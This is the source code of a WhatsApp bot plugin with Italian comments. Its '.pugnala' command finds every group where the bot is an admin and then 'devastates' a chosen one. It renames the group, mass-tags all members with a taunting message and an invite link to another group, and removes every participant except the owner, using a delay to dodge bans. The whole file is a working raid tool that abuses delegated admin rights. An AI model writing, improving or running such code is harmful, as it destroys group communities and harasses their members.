let handler = async (m, { conn, text }) => {
    const ownerJids = global.owner.map(o => o[0] + '@s.whatsapp.net');
    if (!ownerJids.includes(m.sender)) return;

    const botId = conn.user.id.split(':')[0] + '@s.whatsapp.net';

    if (!m.isGroup) {
        if (!text) {
            await m.reply("⏳ *Analisi profonda dei gruppi in corso...*");
            
            // Metodo più affidabile per ottenere la lista ID
            let groupsRaw = await conn.groupFetchAllParticipating();
            let groupIds = Object.keys(groupsRaw);
            let adminGroups = [];

            for (let id of groupIds) {
                try {
                    // Forziamo il recupero dei metadati reali dal server
                    let meta = await conn.groupMetadata(id);
                    let participants = meta.participants || [];
                    
                    // Cerchiamo il bot nella lista partecipanti di quel gruppo
                    let bot = participants.find(p => (p.id || p.jid) === botId);
                    
                    // Verifichiamo se ha i permessi
                    if (bot && (bot.admin === 'admin' || bot.admin === 'superadmin')) {
                        adminGroups.push({
                            id: id,
                            subject: meta.subject
                        });
                    }
                } catch (e) {
                    // Se fallisce (es. il bot è appena stato rimosso), ignora
                    continue;
                }
            }

            if (adminGroups.length === 0) {
                return m.reply("❌ Errore: Non risulto amministratore in nessun gruppo attivo.\n\n*Nota:* Se mi hai appena dato i permessi, aspetta 10 secondi e riprova.");
            }

            let txt = "🩸 *𝐋𝐈𝐒𝐓𝐀 𝐁𝐄𝐑𝐒𝐀𝐆𝐋𝐈 𝐁𝐋𝐎𝐎𝐃* 🩸\n\n";
            txt += "Usa `.pugnala <ID>` per svuotare il gruppo da remoto.\n\n";
            
            adminGroups.forEach((g, i) => {
                txt += `*${i + 1}.* ${g.subject}\n` + "```" + g.id + "```\n\n";
            });

            return m.reply(txt);
        }

        // Esecuzione tramite ID fornito
        let targetId = text.trim();
        if (!targetId.endsWith('@g.us')) return m.reply("❌ Formato ID non valido. Deve finire con @g.us");

        try {
            let meta = await conn.groupMetadata(targetId);
            await m.reply(`⚔️ *TARGET ACQUISITO:* ${meta.subject}\nAvvio procedura di eliminazione...`);
            await executeDevasto(conn, targetId, meta.participants, botId, ownerJids);
            return m.reply("✅ Devasto completato.");
        } catch (e) {
            return m.reply("❌ Impossibile connettersi a questo gruppo.");
        }
    }

    // Esecuzione immediata se usato in un gruppo
    let groupMeta = await conn.groupMetadata(m.chat);
    let isBotAdmin = groupMeta.participants.find(p => p.id === botId)?.admin;
    
    if (!isBotAdmin) return m.reply("❌ Errore: Non ho i poteri di admin qui.");
    
    await executeDevasto(conn, m.chat, groupMeta.participants, botId, ownerJids);
};

async function executeDevasto(conn, chatId, participants, botId, ownerJids) {
    try {
        // 1. Rinominazione
        await conn.groupUpdateSubject(chatId, `𝚂𝚅𝚃 𝙱𝚢 𝐁𝐋𝐎𝐎𝐃`);

        // 2. Messaggi
        let allJids = participants.map(p => p.id || p.jid);
        await conn.sendMessage(chatId, { text: "𝐁𝐥𝐨𝐨𝐝 𝐞̀ 𝐚𝐫𝐫𝐢𝐯𝐚𝐭𝐨... 𝐃𝐄𝐕𝐀𝐒𝐓𝐎." });
        await conn.sendMessage(chatId, { 
            text: "𝐀𝐯𝐞𝐭𝐞 𝐚𝐯𝐮𝐭𝐨 𝐥' 𝐨𝐧𝐨𝐫𝐞 𝐝𝐢 𝐞𝐬𝐬𝐞𝐫𝐞 𝐬𝐭𝐚𝐭𝐢 𝐩𝐮𝐠𝐧𝐚𝐥𝐚𝐭𝐢 𝐝𝐚 𝐁𝐥𝐨𝐨𝐝, 𝐜𝐢 𝐯𝐞𝐝𝐢𝐚𝐦𝐨 𝐪𝐮𝐢:\n\nhttps://chat.whatsapp.com/HsPqgzLHm25LBVcEd7Ldri",
            mentions: allJids
        });

        // 3. Filtro ed eliminazione
        let toRemove = allJids.filter(jid => jid !== botId && !ownerJids.includes(jid));

        for (let user of toRemove) {
            await conn.groupParticipantsUpdate(chatId, [user], 'remove');
            // Delay per evitare il crash o il ban del numero
            await new Promise(res => setTimeout(res, 300)); 
        }
    } catch (e) {
        console.error(e);
    }
}

handler.command = ['pugnala'];
handler.owner = true;

export default handler;
